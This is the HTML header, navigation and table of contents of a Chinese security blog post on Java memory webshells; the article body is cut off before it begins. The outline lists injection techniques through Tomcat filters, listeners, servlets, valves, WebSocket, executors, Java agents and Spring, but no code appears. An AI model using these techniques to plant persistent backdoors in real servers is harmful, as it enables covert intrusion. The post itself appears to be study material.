<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="开启一个补漏的篇章，内存只是听说过还从来没有细细学过。本篇就记录下自己学习java内存马的过程。 1.前置基础 在开始学下之前我们先来了解什么是servlet容器，这里以tomcat为例。 web容器的概念参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;hzk1562110692&#x2F;article&#x2F;details&#x2F;94295947 tomcat原理参考： https:&#x2F;&#x2F;blog.nowcoder">
<meta property="og:type" content="article">
<meta property="og:title" content="Java内存马">
<meta property="og:url" content="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
<meta property="og:description" content="开启一个补漏的篇章，内存只是听说过还从来没有细细学过。本篇就记录下自己学习java内存马的过程。 1.前置基础 在开始学下之前我们先来了解什么是servlet容器，这里以tomcat为例。 web容器的概念参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;hzk1562110692&#x2F;article&#x2F;details&#x2F;94295947 tomcat原理参考： https:&#x2F;&#x2F;blog.nowcoder">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714812004673-e793f486-f91c-4297-b7e7-8fdde01b71a9.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714813938267-fbd3b097-e9fd-4279-bae3-af15bf6b2625.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714821706305-574612a8-d1bc-4d2e-88dc-a08789fa38db.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917345344-c615db5b-5552-46c8-b904-82c3c661b110.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917494259-a9cd4aba-ea46-4903-a647-f67f2bf94f25.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917709111-550f931f-688f-4522-a9dd-c8350153b017.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917971557-6099595a-2995-45aa-8a8f-c5810d4b8060.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715918131371-6d827c6e-0ff0-4325-ae1a-14e6341be117.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715918429489-5ad797a6-55ef-4262-87ea-642724d5b8ec.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927482149-3028d7cf-1a48-428b-b3d2-3808f25bc1df.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927708397-b995071b-016d-45ab-bba9-59a7eeb08821.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927790744-70dd872e-e8ea-4926-b082-ac6e10378545.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715928219779-74b1503a-3823-4298-8921-2513e2bc93c0.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715928697066-2bdcfe9c-ac70-48eb-9541-82afdd287bda.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929629775-79499f1a-8dbd-4489-a920-8334b459c638.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929050800-9193fcf4-8ada-47a0-a15e-6546a5f7dfe1.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929580462-30056289-bc45-487f-812c-711f5bf1841e.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929736823-1afa3139-43d7-4ca1-915f-51a858d9a758.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929765876-047ada2d-7513-4fca-98e0-392259120db5.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932382974-a7004554-d8c8-47f2-96de-82d6e91534f9.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932487587-2eb1b420-300c-41ba-b9fa-1620ece24326.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932592404-eacd9c7b-a606-48a0-b606-068f710f604a.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932861209-3a0794fd-9fc4-4759-ad13-f59bd17d1afa.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715934494968-409c996f-6aec-468b-9196-3739b46963e3.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716104151402-8fb5e5f2-cadc-4b70-9801-51b1c1b8d87e.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716105178459-4f416b76-0e6e-49d6-903b-669fef4817d0.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716104469192-8054c239-d1d1-4c38-8b72-7efe4ff910db.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109108992-fdb1afc5-8bad-4a14-86a4-ac60415792b7.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109216065-90a643e9-d000-4e47-9013-db18dc7671b8.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109329399-55c17b08-0fed-4c30-abc3-c702ae669db6.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109567639-27d5f88f-83a7-40d5-a775-f4addcd1d8df.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109893759-55866782-6b6c-4ed2-8fc2-fba462e12ab7.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109992407-ffa0c485-24f8-40c7-acef-846ab4a6415f.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716302501974-ad72f07b-6755-48dd-9752-110cf116345f.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303440097-2a9ebd08-b7d5-49b7-8fe5-c80405d4ee76.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303726531-2ace81c0-3851-4379-80cb-f719aa4538e1.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303919959-daaadfba-a971-4736-a6b3-f4260c1259bd.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716307433202-ceef5573-912b-4fb0-8020-f69488333d37.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308136617-ada7f674-47b8-42ed-b2e9-784c0d4bc9dc.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308325585-77c98d66-1ef4-4a32-bc79-ac3a129867e1.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308413491-730b5e2c-46e7-41e3-82a0-0a739a037d70.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716440271103-726110c8-9d27-4a52-9bbd-47ea3d19cd07.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449163052-b3a03e1e-329a-4e4d-8398-d488579c8c21.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449314426-4e35fd99-a769-4699-a116-5c049372f7d6.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449508615-332fd3b5-6f36-4228-a88e-4dabc9df6aa1.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449722618-6c65e4a5-4216-4104-88b9-bd9ac9c5b1dd.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449761818-4a3212b2-acb8-494f-8d01-6824ff1bb6af.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716450092523-05413266-8bf2-453a-99f4-3f708c0ede3f.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716450704081-7e2bacee-1e3c-4dae-adc9-4081a9a38731.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716451334308-dc7c779d-aa8a-4f37-b031-519ea66c5a46.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/jpeg/25729212/1717067466354-1c0bd6eb-7c4f-4b39-a861-ebd636722a00.jpeg">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/jpeg/25729212/1717067470239-a162a378-4e14-4137-a7d1-90c3a10fae26.jpeg">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067514381-4045842b-638b-40ea-8ebf-37cac288d151.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067525182-1ce5a737-b3cb-462f-ba62-47a213388bcb.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067589774-a75d3cf2-f437-464d-87de-0d16e55c801f.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067723017-18de439f-c450-4b2c-8958-9db93b21ac2a.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067744447-044667fb-715a-499d-a6a9-7e2506ed036e.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067911718-31db2331-40ef-401e-a8dc-bbdcd31b6a4d.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067977588-edc44af3-3c65-40c9-8754-b07f0fa6505f.png">
<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067985294-d3ab1888-609b-4b3c-a4ca-05446a303b6c.png">
<meta property="article:published_time" content="2024-12-30T05:31:32.000Z">
<meta property="article:modified_time" content="2025-03-05T07:24:36.791Z">
<meta property="article:author" content="Oceanzbz">
<meta property="article:tag" content="内存马">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714812004673-e793f486-f91c-4297-b7e7-8fdde01b71a9.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Java内存马</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-QWTJSPQL4F');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Jndi%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&text=Java内存马"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=Java内存马"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java内存马&body=Check out this article: https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&title=Java内存马"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&name=Java内存马&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/&t=Java内存马"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">1.前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BC%A0%E7%BB%9F%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">2.传统内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1Filter-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.1.</span> <span class="toc-text">2.1Filter 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1%E8%AE%BF%E9%97%AEfilter%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1访问filter之后的调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2%E8%AE%BF%E9%97%AEfilter%E4%B9%8B%E5%89%8D%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2访问filter之前的调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3%E5%85%B3%E4%BA%8EStandardContext%E3%80%81ApplicationContext%E3%80%81ServletContext"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3关于StandardContext、ApplicationContext、ServletContext</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-3-1%E7%BC%96%E5%86%99demo"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">2.1.3.1编写demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2Listener-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">2.2Listener 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E4%BB%80%E4%B9%88%E6%98%AF-Listener%EF%BC%9F"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 什么是 Listener？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-Listener-%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 Listener 类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAdemo%E6%9D%A5%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.3编写一个demo来学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-4%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">2.2.4.</span> <span class="toc-text">2.2.4调试分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3servlet%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">2.3servlet内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1%E4%BB%80%E4%B9%88%E6%98%AFservlet"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1什么是servlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAdemo"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2编写一个demo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3.3 调试过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-4%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-number">2.3.4.</span> <span class="toc-text">2.3.4内存马编写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4valve%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.4.</span> <span class="toc-text">2.4valve内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-1-valve%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.4.0.1.</span> <span class="toc-text">2.4.1 valve是什么</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">2.4.0.2.</span> <span class="toc-text">2.4.2调用过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-3demo%E7%BC%96%E5%86%99"><span class="toc-number">2.4.0.3.</span> <span class="toc-text">2.4.3demo编写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5websocket%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.5.</span> <span class="toc-text">2.5websocket内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-1websocket%E7%AE%80%E4%BB%8B"><span class="toc-number">2.5.1.</span> <span class="toc-text">2.5.1websocket简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.5.2服务端实现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-2-1%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">2.5.2.1注解方式实现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-2-2%E7%BB%A7%E6%89%BF%E6%8A%BD%E8%B1%A1%E7%B1%BB"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">2.5.2.2继承抽象类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat-WebSocket%E7%9A%84%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.5.3.</span> <span class="toc-text">Tomcat WebSocket的加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat-WebSocket%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.5.4.</span> <span class="toc-text">Tomcat WebSocket内存马的实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-3%E5%AE%8C%E6%95%B4%E7%9A%84jsp%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.5.</span> <span class="toc-text">2.5.3完整的jsp注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6upgrade%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.6.</span> <span class="toc-text">2.6upgrade内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7executor%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.7.</span> <span class="toc-text">2.7executor内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">3.agent内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Agent%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.1.</span> <span class="toc-text">Java Agent示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#premain-Agent"><span class="toc-number">3.1.1.</span> <span class="toc-text">premain-Agent</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#agentmain-Agent"><span class="toc-number">3.1.2.</span> <span class="toc-text">agentmain-Agent</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#VirtualMachine%E7%B1%BB"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">VirtualMachine类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#VirtualMachineDescriptor%E7%B1%BB"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">VirtualMachineDescriptor类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Instrumentation"><span class="toc-number">3.1.3.</span> <span class="toc-text">Instrumentation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87JVM%E5%B7%B2%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">获取目标JVM已加载类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%9B%AE%E6%A0%87JVM%E7%9A%84Class%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">修改目标JVM的Class字节码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Instrumentation%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-number">3.2.</span> <span class="toc-text">Instrumentation的局限性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.3.</span> <span class="toc-text">Agent内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-Boot%E4%B8%AD%E7%9A%84Tomcat"><span class="toc-number">3.3.1.</span> <span class="toc-text">Spring Boot中的Tomcat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Java-Agent%E5%AE%9E%E7%8E%B0Spring-Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.3.2.</span> <span class="toc-text">利用Java Agent实现Spring Filter内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-spring%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text">4.spring内存马</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Java内存马
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Oceanzbz</span>
      </span>
      
    <div class="postdate">
      
